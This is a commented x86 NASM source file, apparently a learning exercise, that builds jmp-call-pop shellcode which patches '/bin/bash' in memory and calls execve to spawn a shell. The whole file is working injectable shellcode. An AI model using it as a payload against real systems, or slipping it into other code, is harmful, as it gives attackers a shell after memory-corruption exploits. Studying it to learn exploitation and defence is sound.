section .mytext progbits alloc exec write align=16 ; allow stack writing
; have to change from .text or linker overrides "write"
global _start
_start:
	
	jmp short call_shellcode ; jump to "call shellcode"

shellcode:
	pop esi			 ; POP "message" into esi
	
	xor ebx, ebx
	mov byte [esi +9], bl	 ; move bl into the byte pointed to by esi offset by 9 bytes
				 ; this overwrites the A with 0

	mov dword [esi +10], esi ; move /bin/bash into esi offset by 10 bytes
				 ; this overwrites the B's with the address of /bin/bash

	mov dword [esi +14], ebx ; move ebx into esi offset by 14
				 ; since ebx is still 0x00000000 this overwrites the C's to 0's

	lea ebx, [esi]		 ; lea = load effective address
				 ; lea loads a memory address into the destination register
				 ; this loads the address of "/bin/bash, 0x0" into ebx

	lea ecx, [esi +10]	 ; load the memory address of "/bin/bash, 0x00000000" into ecx

	lea edx, [esi +14]	 ; load the memory address of "0x00000000" into edx

	xor eax, eax
	mov al, 0xb		 ; the syscall number for EXECVE() is 0xb
	int 0x80

	; execve does not return on success, so we do not need an exit() syscall

call_shellcode:
	call shellcode		 ; by using CALL we push "message" onto the stack
	message db "/bin/bashABBBBCCCC"
